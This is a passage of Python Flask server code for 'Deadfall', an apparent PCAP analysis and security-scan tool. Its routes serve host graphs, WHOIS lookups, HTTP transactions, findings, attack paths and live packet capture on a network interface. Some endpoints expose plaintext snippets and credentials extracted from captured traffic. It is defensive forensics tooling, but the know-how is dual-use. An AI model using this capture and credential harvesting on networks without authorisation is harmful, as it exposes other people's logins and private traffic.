                "asn_cidr": r.get("asn_cidr"),
                "network_name": (r.get("network") or {}).get("name"),
                "network_country": (r.get("network") or {}).get("country"),
            }
            try:
                result["rdns"] = socket.gethostbyaddr(ip)[0]
            except Exception:
                result["rdns"] = None
        except Exception as e:
            result = {"ip": ip, "error": str(e)}
        with self.lock:
            self.cache[ip] = result
        return result


app = Flask(__name__, template_folder="templates", static_folder="static")
analysis = None
whois_cache = WhoisCache()
live_capture = LiveCapture()


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/summary")
def api_summary():
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    return jsonify(analysis.summary())


@app.route("/api/graph")
def api_graph():
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    return jsonify(analysis.to_graph_json())


@app.route("/api/host/<path:ip>")
def api_host(ip):
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    detail = analysis.host_detail(ip)
    if not detail:
        return jsonify({"error": "host not found"}), 404
    return jsonify(detail)


@app.route("/api/whois/<path:ip>")
def api_whois(ip):
    return jsonify(whois_cache.lookup(ip))


@app.route("/api/plaintext")
def api_plaintext():
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    results = []
    for (src, dst), f in analysis.flows.items():
        if f["plaintext"]:
            results.append({
                "src": src, "dst": dst,
                "services": sorted(f["services"]),
                "packets": f["packets"], "bytes": f["bytes"],
                "ports": sorted(f["ports"])[:10],
            })
    results.sort(key=lambda x: -x["bytes"])
    samples = []
    for (s, d, port), snips in analysis.plaintext_samples.items():
        for snip in snips:
            samples.append({
                "src": s, "dst": d, "port": port,
                "service": snip["service"], "snippet": snip["snippet"],
            })
    return jsonify({"flows": results, "samples": samples[:100]})


@app.route("/api/credentials")
def api_credentials():
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    return jsonify({"credentials": analysis.credentials})


@app.route("/api/http")
def api_http():
    """Global feed of paired HTTP request/response transactions across all hosts.

    Query params:
      ?q=<substr>            substring filter (case-insensitive) across method/host/path/body
      ?host=<ip>             only transactions where ip is client or server
      ?limit=<n>             cap to last n (default 500, max 2000)
    """
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    q = (request.args.get("q") or "").lower().strip()
    host_filter = (request.args.get("host") or "").strip() or None
    try:
        limit = max(1, min(2000, int(request.args.get("limit", "500"))))
    except Exception:
        limit = 500
    with analysis.lock:
        txns = list(analysis.http_txns)
    if host_filter:
        txns = [t for t in txns if t.get("client") == host_filter or t.get("server") == host_filter]
    if q:
        def hit(t):
            for k in ("request", "response"):
                v = t.get(k)
                if v and q in v.lower():
                    return True
            return False
        txns = [t for t in txns if hit(t)]
    # Return newest first up to `limit`.
    txns = list(reversed(txns[-limit:]))
    return jsonify({
        "total": len(analysis.http_txns),
        "shown": len(txns),
        "transactions": txns,
    })


@app.route("/api/flow/<path:src>/<path:dst>")
def api_flow(src, dst):
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    flow = analysis.flows.get((src, dst))
    if not flow:
        return jsonify({"error": "flow not found"}), 404
    try:
        limit = min(int(request.args.get("limit", 500)), 2000)
        offset = max(int(request.args.get("offset", 0)), 0)
    except ValueError:
        limit, offset = 500, 0
    ids = analysis.flow_packets.get((src, dst), [])
    page_ids = ids[offset:offset + limit]
    pkts = [serialize_packet(analysis.packets[i]) for i in page_ids if i in analysis.packets]
    return jsonify({
        "src": src, "dst": dst,
        "packets": pkts,
        "stored": len(ids),
        "offset": offset,
        "limit": limit,
        "truncated": len(ids) >= analysis.PER_FLOW_CAP,
        "services": sorted(flow["services"]),
        "protocols": sorted(flow["protocols"]),
        "ports": sorted(flow["ports"])[:50],
        "flow_bytes": flow["bytes"],
        "flow_packets": flow["packets"],
        "plaintext": flow["plaintext"],
    })


@app.route("/api/packet/<int:pid>")
def api_packet(pid):
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    p = analysis.packets.get(pid)
    if not p:
        return jsonify({"error": "packet not found"}), 404
    return jsonify(serialize_packet(p, include_payload=True))


@app.route("/api/findings")
def api_findings():
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    severity = request.args.get("severity")
    category = request.args.get("category")
    host = request.args.get("host")
    items = analysis.findings
    if severity:
        items = [f for f in items if f["severity"] == severity]
    if category:
        items = [f for f in items if f["category"] == category]
    if host:
        items = [f for f in items if host in f.get("hosts", [])]
    items = sorted(items, key=lambda f: (SEVERITY_RANK.get(f["severity"], 99), f["category"]))
    cats = sorted({f["category"] for f in analysis.findings})
    sev_counts = Counter(f["severity"] for f in analysis.findings)
    return jsonify({
        "findings": items,
        "categories": cats,
        "severity_counts": dict(sev_counts),
        "total": len(analysis.findings),
    })


@app.route("/api/attack-paths")
def api_attack_paths():
    if not analysis:
        return jsonify({"error": "no pcap loaded"}), 404
    paths = analysis.analyze_attack_paths()
    return jsonify({
        "paths": paths,
        "total": len(paths),
        "by_severity": {s: sum(1 for p in paths if p["severity"] == s)
                        for s in ["critical", "high", "medium", "low", "info"]},
    })


@app.route("/api/live/status")
def api_live_status():
    return jsonify(live_capture.status())


@app.route("/api/live/interfaces")
def api_live_interfaces():
    try:
        return jsonify({"interfaces": sorted(get_if_list())})
    except Exception as e:
        return jsonify({"interfaces": [], "error": str(e)})


@app.route("/api/live/start", methods=["POST"])
def api_live_start():
    if analysis is None:
        return jsonify({"error": "no analysis context"}), 400
    data = request.get_json(silent=True) or {}
    iface = data.get("iface") or live_capture.iface
    bpf = data.get("bpf") if "bpf" in data else live_capture.bpf
    if not iface:
        return jsonify({"error": "iface required"}), 400
    if live_capture.is_running():
        return jsonify({"error": "already running", **live_capture.status()}), 409
    live_capture.configure(analysis, iface, bpf)
    live_capture.start()
    return jsonify(live_capture.status())


@app.route("/api/live/stop", methods=["POST"])
def api_live_stop():
    live_capture.stop()
    return jsonify(live_capture.status())


@app.route("/api/live/save", methods=["POST"])
def api_live_save_start():
    data = request.get_json(silent=True) or {}
    path = (data.get("path") or "").strip() or None
    try:
        live_capture.start_saving(path)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return jsonify(live_capture.save_status())


@app.route("/api/live/save/stop", methods=["POST"])
def api_live_save_stop():
    live_capture.stop_saving()
    return jsonify(live_capture.save_status())


@app.route("/api/live/save/download")
def api_live_save_download():
    status = live_capture.save_status()
    path = status.get("path")
    if not path or not os.path.exists(path):
        return jsonify({"error": "no capture file to download — start saving first"}), 404
    # Flush so the downloaded snapshot is as up-to-date as possible.
    live_capture.flush_saved()
    return send_file(path, as_attachment=True,
                     download_name=os.path.basename(path),
                     mimetype="application/vnd.tcpdump.pcap")


def main():
    ap = argparse.ArgumentParser(description="Deadfall — interactive PCAP host graph + security scan")
    ap.add_argument("pcap", nargs="?", help="path to pcap/pcapng file (omit when using --live)")
    ap.add_argument("--live", metavar="IFACE", help="capture live from interface instead of a file")
    ap.add_argument("--bpf", metavar="FILTER", help="BPF capture filter (live mode)")
    ap.add_argument("--save-to", metavar="PATH",
                    help="save the live capture to this pcap file (live mode only)")
    ap.add_argument("--list-ifaces", action="store_true", help="list available capture interfaces and exit")
    ap.add_argument("--host", default="127.0.0.1", help="bind host (default: 127.0.0.1)")
    ap.add_argument("--port", type=int, default=5000, help="bind port (default: 5000)")
    args = ap.parse_args()

    if args.list_ifaces:
        for name in sorted(get_if_list()):
            print(name)
        return

    if not args.pcap and not args.live:
        ap.error("either PCAP path or --live IFACE is required")
    if args.pcap and args.live:
        ap.error("pass either a PCAP path OR --live, not both")

    global analysis

    if args.pcap:
        if not os.path.exists(args.pcap):
            print(f"[!] file not found: {args.pcap}", file=sys.stderr)
            sys.exit(1)
        analysis = PcapAnalysis(args.pcap)
        print(f"[*] parsing {args.pcap} ...")
        t0 = time.time()

        def progress(n):
            sys.stdout.write(f"\r[*] processed {n} packets")
            sys.stdout.flush()

        analysis.parse(progress_cb=progress)
        print(f"\n[+] done in {time.time() - t0:.2f}s")
        s = analysis.summary()
        sev = s["findings_by_severity"]
        print(f"    hosts: {s['host_count']}  flows: {s['flow_count']}  "
              f"plaintext: {s['plaintext_flows']}  creds: {s['credential_count']}")
        print(f"    findings: {s['finding_count']} "
              f"(crit={sev['critical']} high={sev['high']} med={sev['medium']} "
              f"low={sev['low']} info={sev['info']})")
    else:
        if args.save_to is None and args.pcap is None:
            pass  # no-op, just clarifying the CLI validation already happened
        analysis = PcapAnalysis(source_label=f"live:{args.live}")
        live_capture.configure(analysis, args.live, args.bpf)
        if args.save_to:
            try:
                saved_path = live_capture.start_saving(args.save_to)
                print(f"[*] saving live capture to {saved_path}")
            except Exception as e:
                print(f"[!] could not open save file {args.save_to}: {e}", file=sys.stderr)
                sys.exit(1)
        live_capture.start()
        bpf_note = f" filter=\"{args.bpf}\"" if args.bpf else ""
        print(f"[*] live capture started on {args.live}{bpf_note}")
        print(f"[*] packet sniffing requires root / CAP_NET_RAW — if it fails, check /api/live/status")

    print(f"[*] serving UI at http://{args.host}:{args.port}")
    app.run(host=args.host, port=args.port, debug=False, threaded=True)


if __name__ == "__main__":
    main()
